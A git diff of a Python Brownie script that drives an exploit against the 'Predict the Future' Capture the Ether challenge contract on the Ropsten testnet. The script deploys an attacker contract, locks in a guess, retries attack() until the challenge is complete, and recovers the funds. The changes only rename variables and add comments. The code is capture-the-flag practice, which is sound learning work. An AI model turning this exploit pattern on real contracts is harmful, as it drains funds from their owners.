@@ -1,9 +1,4 @@
-from brownie import (
-    accounts,
-    PredictTheFutureChallenge,
-    PredictTheFutureAttacker,
-    exceptions,
-)
+from brownie import accounts, PredictTheFutureChallenge, PredictTheFutureAttacker
 from web3 import Web3
 import time
 
@@ -12,25 +7,32 @@ challenge_address = "0x9308C5409C71A8581c09033C91EAF43c7B28F61d"
 
 
 def test_predict_the_future():
-    # set up account and contract(s)
+    # load account
     account = accounts.load("Ropsten_test_net_account")
-    challenge_contract = PredictTheFutureChallenge.at(challenge_address)
+
+    # get challenge contract
+    challenge = PredictTheFutureChallenge.at(challenge_address)
+
+    # deploy hacker contract
     hacker = PredictTheFutureAttacker.deploy(challenge_address, {"from": account})
-    print(hacker.address)
     print(f"hacker's balance is: {account.balance()}")
-    print(f"challenge contract balance is: {challenge_contract.balance()}")
-    # exploit contract
+    print(f"challenge contract balance is: {challenge.balance()}")
+
+    # call guess
     tx_guess = hacker.lockInMyGuess(
         {"from": account, "value": eth_amount, "gas_limit": 1e6, "allow_revert": True}
     )
     tx_guess.wait(1)
     print(f"hacker's balance is: {account.balance()}")
-    print(f"challenge contract balance is: {challenge_contract.balance()}")
+    print(f"challenge contract balance is: {challenge.balance()}")
+
     # add another block by waiting 30 seconds
     time.sleep(30)
     print("Guess locked in...")
     print("Starting exploit...")
-    while not challenge_contract.isComplete():
+
+    # start exploit
+    while not challenge.isComplete():
         try:
             tx_exploit = hacker.attack(
                 {"from": account, "gas_limit": 1e5, "allow_revert": True}
@@ -42,9 +44,11 @@ def test_predict_the_future():
             time.sleep(10)
     print("Attack executed successfully")
     print(tx_exploit.info())
+
     # recover funds
     tx = hacker.recoverFunds({"from": account})
     tx.wait(1)
     print(f"The hacker's balance is: {account.balance()}")
-    # assert isComplete function returns true
-    assert challenge_contract.isComplete()
+
+    # confirm the challenge is completed
+    assert challenge.isComplete()
